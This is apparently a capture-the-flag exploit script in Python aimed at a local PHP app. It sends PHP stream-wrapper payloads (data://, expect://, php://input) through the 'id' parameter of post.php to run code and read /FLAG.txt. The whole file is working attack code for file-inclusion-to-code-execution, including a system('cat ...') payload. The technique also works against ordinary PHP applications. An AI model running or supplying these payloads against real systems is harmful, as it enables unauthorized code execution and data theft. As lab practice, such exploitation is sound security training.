import requests
import urllib.parse

base_url = "http://127.0.0.1:32891"

print("[+] Testing PHP code execution through data:// wrapper...")

# Try data wrapper to execute PHP code
php_payloads = [
    "data://text/plain;base64," + __import__('base64').b64encode(b"<?php echo file_get_contents('/FLAG.txt'); ?>").decode(),
    "data://text/plain,<?php echo file_get_contents('/FLAG.txt'); ?>",
    "data:text/plain,<?php system('cat /FLAG.txt'); ?>",
]

for payload in php_payloads:
    print(f"\n[+] Testing data wrapper...")
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    
    if "FLAG{" in resp.text:
        print(f"[!!!] FOUND FLAG!")
        print(resp.text)
        break
    elif "Post not found" not in resp.text and len(resp.text) > 200:
        print(f"Got response length: {len(resp.text)}")
        print(f"Preview: {resp.text[:300]}")
    else:
        print("Not found or blocked")

print("\n[+] Testing expect:// wrapper...")
# Try expect wrapper if enabled
expect_payloads = [
    "expect://cat /FLAG.txt",
    "expect://cat%20/FLAG.txt",
]

for payload in expect_payloads:
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    if "FLAG{" in resp.text:
        print(f"[!!!] FOUND FLAG with expect!")
        print(resp.text)
        break

print("\n[+] Testing input:// wrapper with POST data...")
# Try input wrapper
resp = requests.post(
    f"{base_url}/post.php",
    params={'id': 'php://input'},
    data='<?php echo file_get_contents("/FLAG.txt"); ?>'
)
if "FLAG{" in resp.text:
    print(f"[!!!] FOUND FLAG with input wrapper!")
    print(resp.text)
else:
    print(f"Input wrapper result: {resp.text[:200]}")

